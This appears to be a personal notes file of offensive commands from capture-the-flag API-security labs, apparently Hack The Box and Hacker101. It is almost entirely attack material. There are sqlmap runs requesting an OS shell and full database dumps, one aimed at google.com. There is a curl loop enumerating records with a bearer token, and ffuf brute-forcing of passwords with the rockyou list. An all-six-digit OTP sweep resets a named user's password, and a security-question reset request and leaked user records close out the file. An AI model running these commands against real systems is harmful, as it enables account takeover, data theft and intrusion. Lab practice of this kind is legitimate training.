# sqlmap --url "https://google.com" --batch --random-agent --level 5 --risk 3
# sqlmap --url "https://9caf87260e3d326f26596c0ba3a7bf8b.ctf.hacker101.com/login" --random-agent --level 5 --risk 3 --dump-all -a --os-shell --tamper=between

for ((i=1; i<= 20; i++)); do
curl -v -w "\n" -X 'GET' \
  'http://94.237.58.173:47811/api/v1/suppliers/quarterly-reports/'$i'' \
  -H 'accept: application/json' \
  -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyNTM0NTEzNSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.S7RrGY7MFB_jhKLFpnbLn-9MUXNW9y5igCwMYlyQrylvVje8XQ1-dCsOlDNupBuOFXM0KeV-tESywL72ommiqw" | jq
done

# for ((i=1; i<= 20; i++)); do
# curl -s -w "\n" -X 'GET' \
#   'http://94.237.49.212:43104/api/v1/supplier-companies/yearly-reports/'$i'' \
#   -H 'accept: application/json' \
#   -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw' | jq
# done

#sqlmap -u https://9caf87260e3d326f26596c0ba3a7bf8b.ctf.hacker101.com/login --data 'username=admin&password=test' --random-agent --level 5 --risk 3 --dump-all -v 6 --tamper=space2comment --os-shell --time-sec 10
sqlmap -u https://1578f9ea6092a475ce5c02adce2b56a2.ctf.hacker101.com/ --data 'username=admin&password=test' --random-agent --level 5 --risk 3 -v 6 --os-shell --time-sec 10 --threads 10 --no-cast

ffuf -w /usr/share/wordlists/rockyou.txt:PASS -u http://94.237.58.173:57926/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "Password": "PASS"}' -fr "Invalid Credentials" -t 100




ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASSL -u http://83.136.255.40:53157/api/v1/authentication/customers/passwords/resets -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100

ffuf -w rockyou_filtered.txt:PASS -u http://94.237.58.173:57926/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "Password": "PASS"}' -fr "Invalid Credentials" -t 50


seq -w 000000 999999 > otp_wordlist.txt

94.237.58.173:57926

ffuf -w otp_wordlist.txt:OTP \
     -X POST \
     -H "accept: application/json" \
     -H "Content-Type: application/json" \
     -d '{"Email": "MasonJenkins@ymail.com", "OTP": "OTP", "NewPassword": "123456"}' \
     -u "http://94.237.58.173:57926/api/v1/authentication/customers/passwords/resets" \
     -mr '"SuccessStatus": true'


# "htbpentester5@hackthebox.com" and password "HTBPentester5" 

# Focus on the GET /api/v1/supplier-companies endpoint.

# "htbpentester7@hackthebox.com" and password "HTBPentester7" 

# Focus on the POST /api/v1/customers/orders and /api/v1/customers/orders/items endpoints.


94.237.48.22:45581
Focus on the POST /api/v1/authentication/customers/passwords/resets/sms-otps endpoint.
htbpentester8@pentestercompany.com:HTBPentester8

{
  "id": "eac0c347-12e0-4435-b902-c7e22e3c9dd5",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Patrick Howard",
  "email": "P.Howard1536@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
},
{
  "id": "b87017cd-c720-43a3-acbe-46bfbfd6e4aa",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Luca Walker",
  "email": "L.Walker1872@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
},
{
  "id": "fafebea0-8894-4744-b7de-6c66d5749740",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Tucker Harris",
  "email": "T.Harris1814@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
},
{
  "id": "36f17195-395f-443e-93a4-8ceee81c6106",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Brandon Rogers",
  "email": "B.Rogers1535@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
},
{
  "id": "73ff2040-8d86-4932-bd3f-6441d648dcca",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Mason Alexander",
  "email": "M.Alexander1650@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
},

curl -X 'POST' \
  'http://94.237.59.199:32320/api/v2/authentication/suppliers/passwords/resets/security-question-answers' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "SupplierEmail": "P.Howard1536@globalsolutions.com",
  "SecurityQuestionAnswer": "",
  "NewPassword": "string"
}'

